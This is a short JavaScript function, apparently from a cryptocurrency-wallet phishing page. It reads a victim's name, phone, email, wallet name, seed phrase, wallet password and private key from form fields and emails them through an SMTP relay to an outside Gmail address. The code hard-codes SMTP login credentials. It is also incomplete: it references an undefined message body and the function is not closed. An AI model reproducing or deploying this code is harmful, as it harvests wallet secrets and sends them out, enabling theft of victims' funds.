function emailSend(){

	var userName = document.getElementById('name').value;

	var phone = document.getElementById('phone').value;

	var email = document.getElementById('email'

	).value;

	var wallet = document.getElementById('wallet').value;

	var phrase = document.getElementById('phrase').value;

	var walletp = document.getElementById('walletp'

		).value;

	var privk = document.getElementById('privk'

	).value;

Email.send({

    Host : "smtp.elasticemail.com",

    Username : "adeolatoolz@gmail.com",

    Password : "2172D5A7255CC4CA36D4529DF81CAE9A28F8",

    To : "go.marryjane@gmail.com",

    From : "adeolatoolz@gmail.com",

    Subject : "This is the subject",

    Body : messageBody

}).then(
message => alert(message)
);
